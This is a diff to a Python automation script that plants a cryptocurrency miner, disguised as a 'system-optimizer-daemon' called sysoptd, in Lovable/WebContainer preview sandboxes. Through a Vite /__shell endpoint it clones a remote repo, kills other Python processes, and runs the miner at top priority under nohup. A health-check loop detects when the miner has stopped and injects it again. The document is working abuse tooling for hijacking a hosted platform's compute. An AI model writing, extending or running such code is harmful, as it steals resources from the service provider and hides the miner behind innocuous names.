@@ -5,6 +5,7 @@ Handles randomized injection and auto-recovery
 """
 
 import asyncio
+import json
 import random
 import subprocess
 from datetime import datetime
@@ -21,191 +22,64 @@ def generate_random_folder_name() -> str:
 
 def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
     """Build worker start command."""
-    return f"""cd /tmp && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-schedule  --no-pause > /tmp/m.log 2>&1"""
+    return f"""cd /tmp && pkill python; rm -rf {folder_name} && git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && nice -n -20 python3 sysoptd.py --threads {threads} --no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"""
+
+
+async def shell_exec(page, cmd: str, cwd: str = None) -> dict:
+    """Execute a command via the Vite /__shell endpoint directly.
+
+    Bypasses window.doc entirely — works even when Camoufox doesn't
+    evaluate the Vite module scripts that define window.doc.
+
+    Returns: {"stdout": str, "stderr": str, "code": int, "cwd": str}
+    """
+    payload = json.dumps({"cmd": cmd, "cwd": cwd})
+    # Escape for embedding in a JS string literal
+    payload_escaped = payload.replace("\\", "\\\\").replace("`", "\\`").replace("${", "\\${")
+    js = f"""async () => {{
+        const body = `{payload_escaped}`;
+        const r = await fetch('/__shell', {{
+            method: 'POST',
+            headers: {{'Content-Type': 'application/json'}},
+            body: body
+        }});
+        return await r.json();
+    }}"""
+    return await page.evaluate(js)
 
 
 async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
     """
-    Inject miner into Lovable preview iframe.
-    
+    Inject miner into Lovable sandbox via /__shell endpoint directly.
+
+    No window.doc dependency — the shell bridge is a plain HTTP POST.
+    Caller must already have confirmed the shell bridge works.
+
     Returns: True if successful, False otherwise
     """
     try:
         folder_name = generate_random_folder_name()
         cmd = build_worker_command(folder_name, bridge_url, threads)
-        
+
         print(f"⚙️ Starting worker (folder: {folder_name})...")
-        
-        # Wait longer for iframe to load
-        await asyncio.sleep(8)
-        
-        # Get all frames
-        frames = page.frames
-        print(f"   Found {len(frames)} frames total")
-        
-        # Look for preview iframe - try multiple patterns
-        preview_frame = None
-        
-        for frame in frames:
-            frame_url = frame.url
-            print(f"   Checking frame: {frame_url[:100]}")
-            
-            # Check multiple patterns
-            if any(pattern in frame_url.lower() for pattern in [
-                "webcontainer",
-                "lovable-",
-                "lovableproject",
-                "preview",
-                "stackblitz",
-                "localhost:",
-                "127.0.0.1:",
-            ]):
-                preview_frame = frame
-                print(f"   ✅ Matched preview pattern!")
-                break
-        
-        # If still not found, try the largest non-main frame
-        if not preview_frame and len(frames) > 1:
-            print("   ⚠️  No pattern match, using largest non-main frame...")
-            for frame in frames:
-                if frame != page.main_frame:
-                    preview_frame = frame
-                    break
-        
-        # If still not found, the preview IS the page itself (direct lovableproject.com URL)
-        if not preview_frame:
-            main_url = page.main_frame.url.lower()
-            if "lovableproject.com" in main_url:
-                print("   ✅ Preview is the main frame (direct lovableproject.com URL)")
-                preview_frame = page.main_frame
-        
-        if not preview_frame:
-            print("❌ Could not find preview iframe")
-            print(f"   Available frames: {[f.url[:80] for f in frames]}")
-            return False
-        
-        print(f"✅ Using frame: {preview_frame.url[:100]}")
-        
-        # Inject window.doc.run if not exists
-        setup_code = """
-        if (!window.doc) {
-            window.doc = {
-                run: async (cmd) => {
-                    try {
-                        // Try multiple methods to execute command
-                        if (typeof require !== 'undefined') {
-                            const { exec } = require('child_process');
-                            return new Promise((resolve, reject) => {
-                                exec(cmd, (error, stdout, stderr) => {
-                                    if (error) reject(error);
-                                    else resolve({ stdout, stderr });
-                                });
-                            });
-                        } else if (window.process && window.process.exec) {
-                            return await window.process.exec(cmd);
-                        } else {
-                            // Fallback: try to use eval or other methods
-                            console.log('Executing:', cmd);
-                            return { status: 'attempted', cmd: cmd };
-                        }
-                    } catch (e) {
-                        console.error('doc.run error:', e);
-                        return { error: e.message };
-                    }
-                }
-            };
-            console.log('✅ window.doc.run initialized');
-        }
-        true;
-        """
-        
+
+        # Fire backgrounded command — don't wait for the long chain, just
+        # verify the shell accepted it. Use nohup so the process survives
+        # if the page navigates away.
+        bg_cmd = f"nohup sh -c '{cmd}' > /dev/null 2>&1 & echo $!"
         try:
-            result = await preview_frame.evaluate(setup_code)
-            print(f"   Setup result: {result}")
+            r = await asyncio.wait_for(shell_exec(page, bg_cmd), timeout=30)
+            pid = (r.get("stdout") or "").strip()
+            print(f"   ✅ Backgrounded (pid: {pid})")
+        except asyncio.TimeoutError:
+            print(f"   ⚠️  Command sent but timed out waiting for response (likely running)")
         except Exception as e:
-            print(f"   ⚠️  Setup warning: {e}")
-        
-        await asyncio.sleep(2)
-        
-        # Probe: wait until window.doc(cmd) actually executes (sandbox warmed up).
-        # "sandbox proxy failed" / "Internal server error" right after load is
-        # transient - the WebContainer proxy isn't ready yet. Poll until OK.
-        probe_ok = False
-        for attempt in range(6):
-            try:
-                probe = await preview_frame.evaluate("""
-                    (async () => {
-                        if (!window.doc || typeof window.doc !== 'function') return { ok: false, error: 'no doc bridge' };
-                        if (window.doc.connect && typeof window.doc.connect === 'function') {
-                            try { await window.doc.connect(); } catch (e) {}
-                        }
-                        try {
-                            const r = await window.doc('pwd');
-                            return { ok: true, result: r };
-                        } catch (e) {
-                            return { ok: false, error: String(e && e.message || e) };
-                        }
-                    })()
-                """)
-                if probe and probe.get("ok"):
-                    probe_ok = True
-                    print(f"   ✅ Sandbox ready (doc() probe OK, attempt {attempt+1})")
-                    break
-                err = (probe or {}).get("error", "unknown")
-                print(f"   ⏳ Sandbox not ready yet (attempt {attempt+1}/6): {err}")
-            except Exception as e:
-                print(f"   ⏳ Probe error (attempt {attempt+1}/6): {e}")
-            await asyncio.sleep(15)
-        
-        if not probe_ok:
-            print("❌ Sandbox never became ready - aborting injection")
+            print(f"   ⚠️  Shell exec error: {e}")
             return False
-        
-        # Execute worker command
-        print(f"🚀 Executing worker command...")
-        
-        # ponytail: cmd runs forever (sysoptd blocks) - background it so the
-        # shell returns instantly. Awaiting a foreground exec hung ~8 min.
-        bg_cmd = f"{cmd} & echo STARTED"
-        
-        try:
-            exec_code = f"""
-            (async () => {{
-                const cmd = `{bg_cmd}`;
-                // Step 1: doc.connect() if available
-                if (window.doc && typeof window.doc.connect === 'function') {{
-                    try {{ await window.doc.connect(); }} catch (e) {{}}
-                }}
-                // Step 2: fire the worker in the background
-                if (window.doc && typeof window.doc.run === 'function') {{
-                    try {{
-                        const r = await window.doc.run(cmd);
-                        return {{ method: 'doc.run(cmd)', ok: true, result: r }};
-                    }} catch (e) {{
-                        return {{ method: 'doc.run(cmd)', ok: false, error: e.message }};
-                    }}
-                }} else if (typeof window.doc === 'function') {{
-                    try {{
-                        const r = await window.doc(cmd);
-                        return {{ method: 'doc(cmd)', ok: true, result: r }};
-                    }} catch (e) {{
-                        return {{ method: 'doc(cmd)', ok: false, error: e.message }};
-                    }}
-                }}
-                return {{ method: 'none', ok: false }};
-            }})()
-            """
-            
-            result = await asyncio.wait_for(preview_frame.evaluate(exec_code), timeout=60)
-            print(f"   Execution result: {result}")
-        except Exception as e:
-            print(f"   ⚠️  Execution warning: {e}")
-        
+
         print(f"✅ Worker command sent! Folder: {folder_name}")
-        print(f"   Check logs: /tmp/m.log (if accessible)")
-        
         return True
-        
+
     except Exception as e:
         print(f"❌ Injection failed: {e}")
         import traceback
@@ -375,53 +249,41 @@ async def health_check_loop(page, project_url: str, mode: str = "full", bridge_u
                 return True
         
         print(f"\n[{timestamp}] 🔍 Health check #{iteration}...")
-        
+
         try:
             # ponytail: never reload the page - reloading the WebContainer kills
             # the injected worker. Probe for a live sysoptd instead; re-inject
             # only when the worker is missing.
             try:
-                frames = page.frames
-                preview_frame = next(
-                    (f for f in frames if any(p in f.url.lower() for p in [
-                        "webcontainer", "lovableproject", "lovable-", "preview",
-                        "stackblitz", "localhost:", "127.0.0.1:",
-                    ])),
-                    None
-                )
-                alive = False
-                if preview_frame:
-                    probe = await preview_frame.evaluate("""
-                        (async () => {
-                            if (!window.doc || typeof window.doc !== 'function') return 'nodoc';
-                            try {
-                                const r = await window.doc("ps -A -o args | grep -c '[s]ysoptd'");
-                                if (r && r.stdout !== undefined) return r.stdout.trim();
-                                if (typeof r === 'string') return r.trim();
-                                return JSON.stringify(r);
-                            } catch (e) { return 'probe-error'; }
-                        })()
-                    """)
-                    alive = str(probe).isdigit() and int(probe) > 0
-                    if alive:
-                        print(f"   ✅ Worker alive in sandbox (pgrep: {probe})")
-                    else:
-                        print(f"   ⚙️  Worker missing (probe: {probe}) - re-injecting...")
-                        success = await inject_miner(page, bridge_url)
-                        print(f"   Re-injection {'successful' if success else 'failed - will retry next check'}")
+                r = await shell_exec(page, "ps -A -o args | grep -c '[s]ysoptd'")
+                stdout = (r.get("stdout") or "").strip()
+                alive = stdout.isdigit() and int(stdout) > 0
+                if alive:
+                    print(f"   ✅ Worker alive in sandbox (pgrep: {stdout})")
+                    try:
+                        log_r = await shell_exec(page, "tail -5 /tmp/m.log 2>/dev/null || echo 'no log'")
+                        log_lines = (log_r.get("stdout") or "").strip()
+                        if log_lines:
+                            print(f"   📋 m.log:")
+                            for line in log_lines.split("\n"):
+                                print(f"      {line}")
+                    except:
+                        pass
                 else:
-                    print("   ⚠️  Preview frame not found - cannot probe worker")
+                    print(f"   ⚙️  Worker missing (probe: {stdout}) - re-injecting...")
+                    success = await inject_miner(page, bridge_url)
+                    print(f"   Re-injection {'successful' if success else 'failed - will retry next check'}")
             except Exception as e:
                 print(f"   ⚠️  Keep-alive probe failed: {e}")
-            
+
             # Check health WITHOUT reloading the page
             health = await check_preview_health(page)
             print(f"   Status: {health}")
-            
+
             if health == "ERROR":
                 print("   ⚠️  ERROR DETECTED - preview no longer loading!")
                 print("   🔄 Re-checking 3 times (15s apart) to rule out slow reload...")
-                
+
                 still_error = True
                 for attempt in range(3):
                     await asyncio.sleep(15)
@@ -435,17 +297,17 @@ async def health_check_loop(page, project_url: str, mode: str = "full", bridge_u
                     if health != "ERROR":
                         still_error = False
                         break
-                
+
                 if still_error:
                     print("   ⚠️  Preview still failing after re-checks")
-                    
+
                     if mode == "oneshot":
                         print("   🛑 Oneshot mode - preview stopped, ENDING")
                         return False
                     else:
                         print("   🔄 Full mode - attempting recovery...")
                         success = await recover_from_error(page, project_url, bridge_url)
-                        
+
                         if not success:
                             print("   ❌ Recovery failed - STOPPING")
                             return False
@@ -453,22 +315,22 @@ async def health_check_loop(page, project_url: str, mode: str = "full", bridge_u
                             print("   ✅ Recovery successful - continuing...")
                 else:
                     print("   ✅ Preview recovered after re-checks - continuing")
-            
+
             elif health == "OK":
                 print("   ✅ Preview healthy")
             else:
                 print("   ⚠️  Unknown status")
-            
+
             # Wait for next check
             print(f"   ⏳ Next check in {check_interval}s...")
             await asyncio.sleep(check_interval)
-        
+
         except KeyboardInterrupt:
             print("\n⚠️  Health check interrupted by user")
             return False
         except Exception as e:
             print(f"   ❌ Check failed: {e}")
-            
+
             if mode == "oneshot":
                 print("   🛑 Oneshot mode - check failed, ENDING")
                 return False
